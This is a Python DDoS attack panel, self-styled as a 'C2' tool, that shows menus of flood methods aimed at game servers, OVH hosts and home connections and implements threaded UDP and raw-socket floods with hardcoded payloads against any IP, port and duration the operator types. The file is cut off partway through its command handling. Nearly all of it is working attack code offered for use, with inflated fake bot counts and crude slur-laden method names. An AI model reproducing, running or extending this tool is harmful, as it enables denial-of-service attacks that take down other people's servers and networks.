#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
import codecs,sys
import struct

nicknm = "ANGRYXGledever"

methods = """
\033[91m╔════════════════════════╗
\033[91m║ \033[34m---- \033[32mMethods List! \033[34m--- \033[91m╚═════════╗
\033[91m║ \033[36mgen3   \033[32m> \033[36mShows Gen3 Methods!     \033[91m║
\033[91m║ \033[36mgen2   \033[32m> \033[36mShows Gen2 Methods!     \033[91m║
\033[91m║ \033[36mlayer4 \033[32m> \033[36mShows Layer 4 Methods!  \033[91m║
\033[91m║ \033[36mlayer7 \033[32m> \033[36mShows Layer 7 Methods!  \033[91m║
\033[91m║ \033[36mPrivate\033[32m> \033[36mShows Private Methods!  \033[91m║
\033[91m║ \033[36mraw    \033[32m> \033[36mShows Raw Methods!      \033[91m║
\033[91m║ \033[36mmore   \033[32m> \033[36mShows More Methods!     \033[91m║
\033[91m╚══════════════════════════════════╝
"""

raw = """
\033[91m               ██▀███   ▒█████    ▄████ ▓█████  ██▀███  
\033[91m            ▓██ ▒ ██▒▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
\033[91m            ▓██ ░▄█ ▒▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
\033[91m            ▒██▀▀█▄  ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
\033[91m            ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
\033[91m           ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
\033[91m           ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
\033[91m           ░░   ░ ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
\033[91m           ░         ░ ░        ░    ░  ░   ░     
\033[91m                             ANGRY M\033[36mY GLEDEVER

\033[91m            ╔══════════════════════════╦════════════════════════════╗
\033[91m            ║ \033[36mudpraw \033[34m- \033[36mRaw UDP Flood \033[91m  ║ \033[36mhexraw \033[34m- \033[36mRaw HEX Flood \033[91m    ║
\033[91m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[91m             ║ \033[36mtcpraw \033[34m- \033[36mRaw TCP Flood \033[91m║ ║ \033[36mvseraw \033[34m- \033[36mRaw VSE Flood \033[91m  ║
\033[91m             ║ \033[36mstdraw \033[34m- \033[36mRaw STD Flood \033[91m║ ║ \033[36mqmsynraw \033[34m- \033[36mRaw SYN Flood \033[91m║
\033[91m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[91m            ║    \033[36mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \033[91m║
\033[91m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\033[91m               ██▀███   ▒█████    ▄████ ▓█████  ██▀███  
\033[91m            ▓██ ▒ ██▒▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
\033[91m            ▓██ ░▄█ ▒▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
\033[91m            ▒██▀▀█▄  ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
\033[91m            ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
\033[91m           ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
\033[91m           ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
\033[91m           ░░   ░ ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
\033[91m           ░         ░ ░        ░    ░  ░   ░     
\033[91m                             ANGRY M\033[36mY GLEDEVER

\033[91m            ╔══════════════════════════╦════════════════════════════╗
\033[91m            ║ \033[36movhslav \033[34m- \033[36mSlavic Flood \033[91m  ║ \033[36miotv1 \033[34m- \033[36mCustom Method!  \033[91m   ║
\033[91m            ║ \033[36mcpukill \033[34m- \033[36mCpu Rape Flood\033[91m ║ \033[36miotv2 \033[34m- \033[36mCustom Method!  \033[91m   ║
\033[91m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[91m             ║ \033[36mfivemkill \033[34m- \033[36mFivem Kill \033[91m║ ║ \033[36miotv3 \033[34m-\033[36m Custom Method!  \033[91m ║
\033[91m             ║ \033[36micmprape  \033[34m- \033[36mICMP Rape  \033[91m║ ║ \033[36mssdp  \033[34m-\033[36m Amped SSDP      \033[91m ║
\033[91m             ║ \033[36mtcprape \033[34m- \033[36mRaping TCP   \033[91m║ ║ \033[36marknull \033[34m- \033[36mArk Method    \033[91m ║
\033[91m             ║ \033[36mnforape \033[34m- \033[36mNfo Method   \033[91m║ ║ \033[36m2kdown  \033[34m- \033[36mNBA 2K Flood  \033[91m ║
\033[91m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[91m            ║    \033[36mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \033[91m║
\033[91m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[91m               ██▀███   ▒█████    ▄████ ▓█████  ██▀███  
\033[91m            ▓██ ▒ ██▒▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
\033[91m            ▓██ ░▄█ ▒▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
\033[91m            ▒██▀▀█▄  ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
\033[91m            ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
\033[91m           ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
\033[91m           ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
\033[91m           ░░   ░ ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
\033[91m           ░         ░ ░        ░    ░  ░   ░     
\033[91m                             ANGRY M\033[36mY GLEDEVER

\033[91m            ╔══════════════════════════╦════════════════════════════╗
\033[91m            ║ \033[36mhomeslap    \033[34m. \033[36mr6kill     \033[91m║ \033[36mfivemtcp  \033[34m. \033[36mnfokill       \033[91m ║
\033[91m            ║ \033[36mark255      \033[34m. \033[36marklift    \033[91m║ \033[36mhotspot   \033[34m. \033[36mvpn           \033[91m ║
\033[91m            ║ \033[36mhydrakiller \033[34m. \033[36markdown    \033[91m║ \033[36mnfonull   \033[34m. \033[36mdhcp          \033[91m ║
\033[91m            ╚╦════════════════════════╦╩╦═════════════════════════════════════════════════╦╝
\033[91m             ║ \033[36movhnat    \033[34m. \033[36movhamp     \033[91m║ ║ \033[36movhwdz    \033[34m. \033[36movhx         \033[91m║
\033[91m             ║ \033[36mnfodrop   \033[34m. \033[36mnfocrush   \033[91m║ ║ \033[36mnfodown   \033[34m. \033[36mnfox         \033[91m║
\033[91m             ║ \033[36mudprape   \033[34m. \033[36mudprapev3  \033[91m║ ║ \033[36mfortnite  \033[34m. \033[36mfortnitev2   \033[91m║
\033[91m            ╚╦════════════════════════╦╩╦══════════════════════════════════════════════════╦╝
\033[91m             ║ \033[36mudprapev2 \033[34m. \033[36mudpbypass  \033[91m║ ║ \033[36mgreeth    \033[34m. \033[36mtelnet       \033[91m║
\033[91m             ║ \033[36mfivemv2   \033[34m. \033[36mr6drop     \033[91m║ ║ \033[36mr6freeze  \033[34m. \033[36mkillall      \033[91m║
\033[91m             ║ \033[36m2krape    \033[34m. \033[36mfallguys   \033[91m║ ║ \033[36movhdown   \033[34m. \033[36movhkill      \033[91m║
\033[91m            ╚╦════════════════════════╦╩╦═════════════════════════════════════════════╦════╦╝
\033[91m             ║ \033[36mfivemrape \033[34m. \033[36mfivemdown  \033[91m║ ║ \033[36mfivemv1   \033[34m. \033[36mfivemslump   \033[91m║
\033[91m             ║ \033[36mkillallv2 \033[34m. \033[36mkillallv3  \033[91m║ ║ \033[36mpowerslap \033[34m. \033[36mrapecom      \033[91m║
\033[91m             ║ \033[36mOVH-KILLERv1 \033[34m. \033[36m-v3  \033[91m║ ║ \033[36mgreeth    \033[34m. \033[36mtelnet       \033[91m║
\033[91m            ╚╦════════════════════════╦╩╦═════════════════════════════════════════════╦════╦╝
\033[91m             ║ \033[36mOVH-KILLERV2   \033[34m. \033[36movhdownv1     \033[91m║ ║ \033[36movhampv1  \033[34m. \033[36m[Kosong]      \033[91m║
\033[91m             ║ \033[36mOVH-KILLERV2    \033[34m. \033[36movhdownv2   \033[91m║ ║ \033[36movhampv2   \033[34m. \033[37[Kosong]      \033[91m║
\033[91m             ║ \033[36mtcpkillerv1 \033[34m. \033[36movhdownv3   \033[91m║ ║ \033[36movhampv3  \033[34m. \033[36m[Kosong]   \033[91m║
\033[91m            ╚╦════════════════════════╦╩╦═════════════════════════════════════════════╦════╦╝
\033[91m             ║ \033[36mtcpkillerv1 \033[34m. \033[36movhampv1  \033[91m║ ║ \033[36m[Kosong] \033[34m. \033[36m[Kosong]      \033[91m║
\033[91m             ║ \033[36mtcpkillerv2 \033[34m. \033[36m[Kosong]  \033[91m║ ║ \033[36m[Kosong] \033[34m. \033[36m[Kosong]      \033[91m║
\033[91m             ║ \033[36mtcpkillerv3 \033[34m. \033[36m[Kosong]  \033[91m║ ║ \033[36m[Kosong] \033[34m. \033[36m[Kosong]      \033[91m║
\033[91m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[91m            ║    \033[36mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \033[91m║
\033[91m            ╚═══════════════════════════════════════════════════════╝
"""



layer4 = """
\033[91m               ██▀███   ▒█████    ▄████ ▓█████  ██▀███  
\033[91m            ▓██ ▒ ██▒▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
\033[91m            ▓██ ░▄█ ▒▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
\033[91m            ▒██▀▀█▄  ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
\033[91m            ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
\033[91m           ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
\033[91m           ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
\033[91m           ░░   ░ ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
\033[91m           ░         ░ ░        ░    ░  ░   ░     
\033[91m                             ANGRY M\033[36mY GLEDEVER
\033[91m            ╔══════════════════════════╦════════════════════════════╗
\033[91m            ║  \033[36mudp \033[36m[IP] [TIME] [PORT]  \033[91m║   \033[36mvse \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m            ║  \033[36mtcp \033[36m[IP] [TIME] [PORT]  \033[91m║   \033[36mack \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[91m             ║ \033[36mstd \033[36m[IP] [TIME] [PORT] \033[91m║ ║ \033[36mdns \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m             ║ \033[36msyn \033[36m[IP] [TIME] [PORT] \033[91m║ ║ \033[36movh \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m             ║════════════\033[34mhomerape \033[33m[IP] [TIME] [PORT] \033[36m- - - - - -\033[91m═════════════════║
\033[91m             ║ \033[36movhslav \033[36m[IP] [TIME] [PORT] \033[91m║ ║ \033[36movhkillv2 \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m             ║ \033[36movhkillv1 \033[36m[IP] [TIME] [PORT] \033[91m║ ║ \033[36movhkillv3 \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m             ║════════════\033[34mhomerapev1 \033[33m[IP] [TIME] [PORT] \033[36m- - - - - -\033[91m═════════════════║
\033[91m             ║\033[36movhslavv1  \033[36m[[IP] [TIME] [PORT] \033[91m║ ║ \033[36movhslavv2 \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m             ║\033[36movhslavv3  \033[36m[[IP] [TIME] [PORT] \033[91m║ ║ \033[36m[Kosong] \033[36m[IP] [TIME] [PORT]   \033[91m║
\033[91m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[91m            ║    \033[36mExample How To Attack\033[93m: \033[32mMETHOD [IP] [TIME] [PORT]   \033[91m║
\033[91m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """

\033[91m               ██▀███   ▒█████    ▄████ ▓█████  ██▀███  
\033[91m            ▓██ ▒ ██▒▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
\033[91m            ▓██ ░▄█ ▒▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
\033[91m            ▒██▀▀█▄  ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
\033[91m            ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
\033[91m           ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
\033[91m           ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
\033[91m           ░░   ░ ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
\033[91m           ░         ░ ░        ░    ░  ░   ░     
                                    ANGRY M\033[36mYGLEDEVER              
                      
\033[91m           ╔═══════════════════════════════════════════════╗
\033[91m           ║\033[36m- - - - - - - ANGRYXGledever C2 By \033[36m@ANGRYXGledever \033[36m- - - - - - -\033[91m ║
\033[91m           ║\033[36m  - - - Type \033[36mhelp\033[36m to see the Help Menu - - -\033[91m   ║
\033[91m           ╚╦═════════════════════════╦╩╦══════════════════╦╝
\033[91m           ╚╦═════════════════════════╦╩╦══════════════════╦╝
\033[91m              ║   \033[36m- -Don't share tools and don't abuse\033[36m(ANGRYXGledever)- -\033[91m║
\033[91m           ╦════════════════════════╦╩╦════════════════════╦
\033[91m           ╚═════════════════════════╦╩╦══════════════════╦╝
\033[91m              ║   \033[36m- -Has Been Connection \033[36m(ANGRYXGledever)- -\033[91m║
\033[91m           ╦════════════════════════╦╩╦════════════════════╦
\033[91m           ╚═════════════════════════╦╩╦══════════════════╦╝
\033[91m              ║   \033[36m- -This Only Purporse Tools Dm Me@ANGRYXGLEDEVER#1111 \033[36m(ANGRYXGledever)- -\033[91m║
\033[91m           ╦════════════════════════╦╩╦════════════════════╦
\033[91m           ╚═════════════════════════╦╩╦══════════════════╦╝
\033[91m              ║   \033[36m- -Has Been Connection \033[36m(ANGRYXGledever)- -\033[91m║
\033[91m           ╦════════════════════════╦╩╦════════════════════╦
\033[91m           ╚═════════════════════════╦╩╦══════════════════╦╝
\033[91m              ║   \033[36m- -Wait For Update/Upgrade Tools \033[36m(ANGRYXGledever)- -\033[91m║
\033[91m           ╦════════════════════════╦╩╦════════════════════╦
\033[91m           ╚╦═════════════════════════╦╩╦══════════════════╦╝
\033[91m              ║\033[36m- - - - - - - ANGRYXGledever C2 By \033[36m@ANGRYXGledever \033[36m- - - - - - -\033[91m ║
\033[91m              ║\033[36m  - - - Type \033[36mhelp\033[36m to see the Help Menu - - -\033[91m   ║
\033[91m              ╚═══════════════════════════════════════════════╝
"""

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(5025,65531))
		bots = (random.randint(5025,65530))
		avi = (random.randint(5025,10334533))
		sys.stdout.write("\x1b]2;ANGRYXGledever | Devices: [{}] | Spoofed Servers [99999] | Server Units [99999] | Clients: [99999]\x07".format (bots,avi))
		sin = input("\033[91m[\033[91m{}\033[36m@ANGRYXGledever\033[91m]\033[32m$ \033[91m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "method":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("clear")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched!!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-kill":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						pack = 16661
						drop = 16661
						punch = random._urandom(int(pack))
						punch = random._urandom(int(drop))
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						pack = 16661
						drop = 16661
						punch = random._urandom(int(pack))
						punch = random._urandom(int(drop))
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[91mYour Attack Has Been Launched To \033[36mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65530
					drop = 65530
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[91mYour Attack Has Been Launched To \033[36mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 112688
					drop = 122688
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-bypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 816661
					drop = 816661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-nat":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
